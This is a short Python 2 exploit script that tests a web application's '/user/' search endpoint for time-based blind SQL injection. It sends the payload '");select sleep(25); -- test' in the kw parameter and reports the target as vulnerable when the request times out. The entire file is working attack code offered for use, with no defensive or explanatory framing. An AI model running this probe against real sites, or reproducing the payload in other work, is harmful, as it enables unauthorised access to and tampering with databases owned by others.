#! /usr/bin/env python
# -*- coding: utf-8 -*-
#!/usr/bin/python

from __future__ import print_function

import sys
import time
from optparse import OptionParser

try:
    import requests
except ImportError, e:
    print("[-] Requests missing, please install requests module")
    sys.exit(0)


def exploit(domain):
    test_url = ('{domain}/user/?q=help&type=search&page=1&kw=test&lang=zh_CN)'.format(domain=domain))
    evil_url = ('{domain}/user/?q=help&type=search&page=1&kw=test");select sleep(25); -- test'
                '&lang=zh_CN'.format(domain=domain))

    print("[*] Make a normal request ...")
    try:
        requests.get(test_url, timeout=15)
    except requests.exceptions.Timeout:
        print("[-] Use too much time, exit")
        return 0

    print("[*] Make a evil request ... waiting")
    try:
        requests.get(evil_url, timeout=15)
    except requests.exceptions.Timeout:
        print("[+] Target is vulnerable")
        return 1
    else:
        print("[-] Target is no vulnerable")
        return 0



def main():

    domain = sys.argv[1]
    port = sys.argv[2]

    domain = domain if domain.startswith('http') else "http://{domain}:{port}".format(domain=domain,port=str(port))
    domain = domain if not domain.endswith('/') else domain[:-1]

    return exploit(domain)


if __name__ == "__main__":
    main()
